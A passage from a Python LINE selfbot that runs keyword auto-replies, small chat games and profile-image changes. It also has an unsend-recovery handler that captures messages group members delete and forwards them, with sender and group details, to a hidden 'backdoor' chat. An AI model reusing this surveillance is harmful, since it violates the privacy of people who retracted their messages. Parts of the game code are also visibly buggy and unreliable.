                            han.replyMessage(msg, "新增關鍵字回復失敗")
                        del x
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text.startswith("del_reply:"):
                        key = msg[10][10:]
                        if key in reply['textreply']:
                            del reply['textreply'][key]
                            han.replyMessage(msg, "已刪除關鍵字回復")
                            backupData()
                        else:
                            han.replyMessage(msg, "無此關鍵字")
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text.startswith("readd_reply:"):
                        key = msg[10][12:].split(" ")
                        x = []
                        for i in key:
                            x.append(i)
                        if len(x) == 2:
                            if x[0] in reply['textreply']:
                                del reply['textreply'][x[0]]
                                reply['textreply'][x[0]] = x[1]
                                han.replyMessage(msg, "已重設關鍵字回復")
                                han.replyMessage(msg, f"※偵測關鍵字:\n{x[0]}\n※回復訊息:\n{x[1]}")
                                backupData()
                            else:     
                                han.replyMessage(msg, "無此關鍵字")
                        else:
                            han.replyMessage(msg, "重設關鍵字回復失敗")
                        del x
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text.startswith("add_creply:"):
                        key = msg[10][11:].split(" ")
                        x = []
                        for i in key:
                            x.append(i)
                        if len(x) == 2:
                            try:
                                han.getContact(x[1])
                                if x[0] in reply['contactreply']:
                                    han.replyMessage(msg, "已有此關鍵字")
                                else:
                                    user = han.getContact(x[1])
                                    reply['contactreply'][x[0]] = x[1]
                                    han.replyMessage(msg, "已新增友資回復")
                                    han.replyMessage(msg, f"※偵測關鍵字:\n{x[0]}\n※回復友資:\n{user[22]}\n{x[1]}")
                                    backupData()
                            except:
                                han.replyMessage(msg, "Error-->invalid mid")
                        else:
                            han.replyMessage(msg, "新增友資回復失敗")
                        del x
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text.startswith("del_creply:"):
                        key = msg[10][11:]
                        if key in reply['contactreply']:
                            del reply['contactreply'][key]
                            han.replyMessage(msg, "已刪除友資回復")
                            backupData()
                        else:
                            han.replyMessage(msg, "無此關鍵字")
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text.startswith("readd_creply:"):
                        key = msg[10][13:].split(" ")
                        x = []
                        for i in key:
                            x.append(i)
                        if len(x) == 2:
                            try:
                                han.getContact(x[1])
                                if x[0] in reply['contactreply']:
                                    user = han.getContact(x[1])
                                    del reply['contactreply'][x[0]]
                                    reply['contactreply'][x[0]] = x[1]
                                    han.replyMessage(msg, "已重設友資回復")
                                    han.replyMessage(msg, f"※偵測關鍵字:\n{x[0]}\n※回復友資:\n{user[22]}\n{x[1]}")
                                    backupData()
                                else:
                                    han.replyMessage(msg, "無此關鍵字")
                            except:
                                han.replyMessage(msg, "Error-->invalid mid")
                        else:
                            han.replyMessage(msg, "重設友資回復失敗")
                        del x
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if to in game['game']:
                        ranlist = []
                        def generate(lst):
                            while len(lst) < 4:
                                lst.append(randint(1,9))
                                if len(lst) > 1:
                                    x = 0
                                    while x < len(lst)-1:
                                        if lst[x] == lst[len(lst)-1]:
                                            del lst[len(lst)-1]
                                        else:
                                            x += 1
                            final_ans = ""
                            for i in range(0,len(lst)):
                                final_ans = final_ans + str(lst[i])
                            return final_ans
                        match text:
                            case "#game":
                                try:
                                    ret_ = "ΞΞΞΞΞΞ〘遊戲狀態〙ΞΞΞΞΞΞ"
                                    if to in game['1a2b']:
                                        ret_ += "\n※1A2B:🟢"
                                    else:
                                        ret_ += "\n※1A2B:🔴"
                                    if to in game['guessnumber']:
                                        ret_ += "\n※猜數字:🟢"
                                    else:
                                        ret_ += "\n※猜數字:🔴"
                                    ret_ += "\nΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞ"
                                    han.replyMessage(msg, str(ret_))
                                    cd.append(msg[1])
                                    time.sleep(2)
                                    cd.remove(msg[1])
                                except Exception as e:
                                    han.replyMessage(msg,f'error-->\n{e}')
                                    cd.append(msg[1])
                                    time.sleep(2)
                                    cd.remove(msg[1])
                            case "拉霸":
                                cd.append(msg[1])
                                a = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                b = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                c = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                d = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                e = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                f = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                g = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                h = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                i = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                j = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                k = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                l = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                m = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                n = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                o = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
                                slot = "拉霸機拉霸一次\n第一行==>{}  {}  {}<==\n第二行==>{}  {}  {}<==\n第三行==>{}  {}  {}<==\n第四行==>{}  {}  {}<==\n第五行==>{}  {}  {}<==\n以上是您的拉霸結果".format(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o)
                                han.replyMessage(msg,slot)
                                time.sleep(2)
                                cd.remove(msg[1])
                            case '#1a2b':
                                if to not in game['guessnumber']:
                                    if to not in game['1a2b']:
                                        game['1a2b'].append(to)
                                        try:
                                            del game['1a2bans'][to]
                                        except:
                                            pass
                                        han.replyMessage(msg,"已進入1A2B遊戲")
                                        han.replyMessage(msg,"請輸入4位數字並以%作為開頭")
                                        han.replyMessage(msg,"例如:%1234")
                                        x=generate(ranlist)
                                        game['1a2bans'][to]=x
                                        backupData()
                                    else:
                                        han.replyMessage(msg,"已經是1A2B遊戲狀態")
                                        han.replyMessage(msg,"請先輸入退出1a2b後再試一次")
                                else:
                                    han.replyMessage(msg,"其他遊戲進行中\n請先退出其他遊戲後再試一次")
                                    han.replyMessage(msg,"可輸入#game來查詢")
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                            # case '#猜數字':
                            #     if to not in game['1a2b']:
                            #         if to not in game['guessnumber']:
                            #             game['guessnumber'].append(to)
                            #             han.replyMessage(msg,"已進入猜數字遊戲")
                            #             han.replyMessage(msg,"請給定數字範圍") 
                            #             han.replyMessage(msg,"輸入最小值並以lowest:作為開頭")
                            #             han.replyMessage(msg,"例如:lowest:1")
                            #             backupData()
                            #         else:
                            #             han.replyMessage(msg,"已經是猜數字遊戲狀態")
                            #             han.replyMessage(msg,"請先輸入退出猜數字後再試一次")
                            #     else:
                            #         han.replyMessage(msg,"其他遊戲進行中\n請先退出其他遊戲後再試一次")
                            #         han.replyMessage(msg,"可輸入#game來查詢")
                            #     cd.append(msg[1])
                            #     time.sleep(2)
                            #     cd.remove(msg[1])
                        if text.startswith("#猜數字:"):
                            num = []
                            key = msg[10][5:].split(" ")
                            for i in key:
                                num.append(i)
                            if to not in game['1a2b']:
                                if to not in game['guessnumber']:
                                    if len(num) == 2:
                                        game['guessnumber'].append(to)
                                        game['guessnumberlow'][to] = int(num[0])
                                        game['guessnumberhigh'][to] = int(num[1])
                                        game['guessnumberans'][to] = randint(int(num[0]),int(num[1]))
                                        han.replyMessage(msg,"已進入猜數字遊戲")
                                        han.replyMessage(msg,f"請輸入介於{str(num[0])}~{str(num[1])}數字並以%作為開頭")
                                        han.replyMessage(msg,f"例如:%{randint(int(num[0]),int(num[1]))}")
                                        backupData()
                                    else:
                                        han.replyMessage(msg,"請輸入正確格式\n#猜數字:最小值 最大值")
                                        han.replyMessage(msg,"例如:#猜數字:1 100")
                                else:
                                    han.replyMessage(msg,"已經是猜數字遊戲狀態")
                                    han.replyMessage(msg,"請先輸入退出猜數字後再試一次")
                            else:
                                han.replyMessage(msg,"其他遊戲進行中\n請先退出其他遊戲後再試一次")
                                han.replyMessage(msg,"可輸入#game來查詢")                     
                            del num
                        if to in game['guessnumber']:
                            # if text.startswith("lowest:"):
                            #     if to not in game['guessnumberlow']:
                            #         lowest = msg[10][7:]
                            #         game['guessnumberlow'][to] = int(lowest)
                            #         backupData()
                            #         han.replyMessage(msg,"最小值已設定為:" + lowest)
                            #         if to not in game['guessnumberhigh']:
                            #             han.replyMessage(msg,"輸入最大值並以highest:作為開頭")
                            #             han.replyMessage(msg,"例如:highest:100")
                            #         else:
                            #             han.replyMessage(msg,f"請輸入介於{str(game['guessnumberlow'][to])}~{str(game['guessnumberhigh'][to])}數字並以%作為開頭")
                            #             han.replyMessage(msg,f"例如:%{str(randint(game['guessnumberlow'][to],game['guessnumberhigh'][to]))}")
                            #             game['guessnumberans'][to] = randint(game['guessnumberlow'][to],game['guessnumberhigh'][to])
                            #     else:
                            #         han.replyMessage(msg,"已設定過最小值")
                            #     cd.append(msg[1])
                            #     time.sleep(2)
                            #     cd.remove(msg[1])
                            # if text.startswith("highest:"):
                            #     if to not in game['guessnumberhigh']:
                            #         highest = msg[10][8:]
                            #         game['guessnumberhigh'][to] = int(highest)
                            #         backupData()
                            #         han.replyMessage(msg,"最大值已設定為:" + highest)
                            #         if game['guessnumberlow'] == "":
                            #             han.replyMessage(msg,"輸入最小值並以lowest:作為開頭")
                            #             han.replyMessage(msg,"例如:lowest:1")
                            #         else:
                            #             han.replyMessage(msg,f"請輸入介於{str(game['guessnumberlow'][to])}~{str(game['guessnumberhigh'][to])}整數並以%作為開頭")
                            #             han.replyMessage(msg,f"例如:%{str(randint(game['guessnumberlow'][to],game['guessnumberhigh'][to]))}")
                            #             game['guessnumberans'][to] = randint(game['guessnumberlow'][to],game['guessnumberhigh'][to])
                            #     else:
                            #         han.replyMessage(msg,"已設定過最大值")
                            #     cd.append(msg[1])
                            #     time.sleep(2)
                            #     cd.remove(msg[1])
                            if text.startswith("%"):
                                if to not in game['guessnumberlow']or to not in game['guessnumberhigh']:
                                    han.replyMessage(msg,"尚未給定範圍")
                                else:
                                    guess = msg[10][1:]
                                    try:
                                        guess = int(guess)  
                                    except ValueError:  
                                        han.replyMessage(msg,'格式錯誤，請輸入數字\n')
                                    if guess <= game['guessnumberlow'][to] or guess >= game['guessnumberhigh'][to]:
                                        han.replyMessage(msg,'請輸入介於' + str(game['guessnumberlow'][to]) + '~' + str(game['guessnumberhigh'][to]) + '之間的整數')
                                    if guess == game['guessnumberans'][to]:
                                        han.replyMessage(msg,"答對了! 答案就是" + str(guess))
                                        game['guessnumber'].remove(to)
                                        del game['guessnumberlow'][to]
                                        del game['guessnumberhigh'][to]
                                        del game['guessnumberans'][to]
                                        backupData()
                                    elif guess < game['guessnumberans'][to]:
                                        game['guessnumberlow'][to] = guess
                                        backupData()
                                    else:
                                        game['guessnumberhigh'][to] = guess
                                        backupData()
                                    if to not in game['guessnumberlow'][to] or to not in game['guessnumberhigh'][to] or guess <= game['guessnumberlow'][to] or guess >= game['guessnumberhigh'][to]:
                                        pass
                                    else:
                                        han.replyMessage(msg,f"數字介於{str(game['guessnumberlow'][to])}~{str(game['guessnumberhigh'][to])}之間")
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                            if text == "退出猜數字":
                                game['guessnumber'].remove(to)
                                del game['guessnumberlow'][to]
                                del game['guessnumberhigh'][to]
                                del game['guessnumberans'][to]
                                han.replyMessage(msg,"已退出猜數字遊戲")
                                backupData()
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                            if text == "猜數字答案":
                                if to not in game['guessnumberans']:
                                    han.replyMessage(msg,"尚未給定範圍")
                                else:
                                    han.replyMessage(msg,"答案為:" + str(game['guessnumberans'][to]))
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                        if to in game['1a2b']:
                            if text.startswith("%"):
                                ans = msg[10][1:]
                                finans = game['1a2bans'][to]
                                counter = 1
                                result = 0
                                for i in range(0,len(finans)):
                                    for j in range(0,len(finans)):
                                        if ans[i] == finans[j]:
                                            if i == j:
                                                result += 10
                                            else:
                                                result += 1
                                han.replyMessage(msg,str(int(result/10)) + 'A' + str(result%10) + 'B')
                                counter += 1
                                if result == 40:
                                    han.replyMessage(msg,"恭喜你! 答案就是" + str(finans))
                                    game['1a2b'].remove(to)
                                    del game['1a2bans'][to]
                                    backupData()
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                            if text == "退出1a2b":
                                game['1a2b'].remove(to)
                                del game['1a2bans'][to]
                                han.replyMessage(msg,"已退出1A2B遊戲")
                                backupData()
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                            if text == "1a2b答案":
                                han.replyMessage(msg,"答案是" + str(game['1a2bans'][to]))
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                                
                        


            if msg[15] == 1:
                if settings["pic"] == True:
                    if msg[1] in settings["picmid"]:
                        try:
                            han.downloadObjectMsg(msg[4],path="test.jpg")
                            han.sendMessage(msg[2], "圖片下載完成\n正在更換頭貼(｡･ω･｡)")
                            han.updateProfileImage(path="test.jpg")
                            han.sendMessage(msg[2], "更改完成(｡･ω･｡)")
                            settings["pic"] = False           
                            settings["picmid"] = [] 
                            backupData()   
                            os.remove("test.jpg")
                        except Exception as e:
                            print(e)
                            han.sendMessage(msg[2], "更改失敗(｡･ω･｡)")
                            han.sendMessage(msg[2], f'{e}')
                            settings["pic"] = False           
                            settings["picmid"] = [] 
                            backupData()
                            os.remove("test.jpg")
                if settings['cover'] == True:
                    if msg[1] in settings["covermid"]:
                        try:
                            han.downloadObjectMsg(msg[4],path="cover.jpg")
                            han.sendMessage(msg[2], "圖片下載完成\n正在更換封面(｡･ω･｡)")
                            han.updateProfileCover(path="cover.jpg")
                            han.sendMessage(msg[2], "更改完成(｡･ω･｡)")
                            settings["cover"] = False           
                            settings["covermid"] = [] 
                            backupData()   
                            os.remove("cover.jpg")
                        except Exception as e:
                            print(e)
                            han.sendMessage(msg[2], "更改失敗(｡･ω･｡)")
                            han.sendMessage(msg[2], f'{e}')
                            settings["cover"] = False           
                            settings["covermid"] = [] 
                            backupData()
                            os.remove("cover.jpg")
        if op[3] == 65:
            gid = op[10]
            msgid = op[11]
            msgids = han.getPreviousMessageIds(gid, 1000)
            target_msg = None
            for x in msgids[1]:
                if msgid == str(x[2]):
                    target_msg = x
                    break
            if target_msg is not None:
                target_msg = han.getPreviousMessagesV2(gid, target_msg[1], target_msg[2])[0]
                if target_msg[1] not in cd:
                    if target_msg[15] == 0:
                        text = target_msg[10]
                        unstime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(target_msg[5]/1000))))))
                        group = han.getChats([gid])[1][0][6]
                        user = han.getContact(target_msg[1])[22]
                        if gid in red['reread']:
                            a = f"@chrline\n"
                            a += f"※收回訊息:\n{text}"
                            a += f"\n※收回時間:\n{unstime}"
                            arr = [{"S": str(0),"E": str(8),"M": target_msg[1]}]
                            tag = {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}
                            han.sendMessage(gid, a,contentMetadata=tag)
                        else: 
                            pass
                        txt = "ΞΞΞΞΞΞΞ〘復讀系統〙ΞΞΞΞΞΞΞ\n"
                        txt += "※訊息類別:文字\n"
                        txt += f"※群組:\n{group}\n{gid}"
                        txt += f"\n※發送者:\n{user}\n{target_msg[1]}"
                        txt += f"\n※收回時間:\n{unstime}"
                        txt += f"\n※訊息內容:\n{text}"
                        txt += f"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
                        han.sendMessage(backdoor['backdoor'], txt)
                        cd.append(target_msg[1])
                        time.sleep(2)
                        cd.remove(target_msg[1])

                    # if target_msg[15] == 1:
                    #     han.downloadObjectMsg(target_msg[4],path="unsend.jpg")
                    #     unstime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(target_msg[5]/1000))))))
                    #     group = han.getChats([gid])[1][0][6]
                    #     user = han.getContact(target_msg[1])[22]
                    #     if gid in red['reread']:
                    #         a = f"@chrline\n"
                    #         a += f"※收回圖片:下方"
                    #         a += f"\n※收回時間:\n{unstime}"
                    #         arr = [{"S": str(0),"E": str(8),"M": target_msg[1]}]
                    #         tag = {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}
                    #         han.sendMessage(gid, a,contentMetadata=tag)
                    #         han.sendImage(gid,"unsend.jpg")
                    #     else: 
                    #         pass
                    #     txt = "ΞΞΞΞΞΞΞ〘復讀系統〙ΞΞΞΞΞΞΞ\n"
                    #     txt += "※訊息類別:圖片\n"
                    #     txt += f"※群組:\n{group}\n{gid}"
                    #     txt += f"\n※發送者:\n{user}\n{target_msg[1]}"
                    #     txt += f"\n※收回時間:\n{unstime}"
                    #     txt += f"\n※訊息內容:\n下方圖片"
                    #     txt += f"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
                    #     han.sendMessage(backdoor['backdoor'], txt)
                    #     han.sendImage(backdoor['backdoor'],"test.jpg")
                    #     os.remove("unsend.jpg")
                    #     cd.append(target_msg[1])
                    #     time.sleep(2)
                    #     cd.remove(target_msg[1])



    def main(self):
        self.start()
        try:
            self.han.trace(self.bot)
        except Exception as e:
            print(e)
            os._exit(1)
if __name__=='__main__':
    bot()
